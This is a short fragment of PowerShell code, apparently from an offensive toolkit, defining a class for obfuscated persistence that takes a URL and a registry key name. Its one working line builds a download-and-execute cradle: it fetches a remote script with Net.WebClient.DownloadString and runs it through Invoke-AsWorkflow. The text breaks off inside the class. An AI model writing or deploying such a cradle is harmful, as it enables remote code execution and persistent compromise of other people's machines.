Class ObfPersistenceExecuteScriptWeb16 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent16.ps1
        $DoAll = "Invoke-AsWorkflow -Expres ((New-Object Net.WebClient).DownloadString('$url'))"
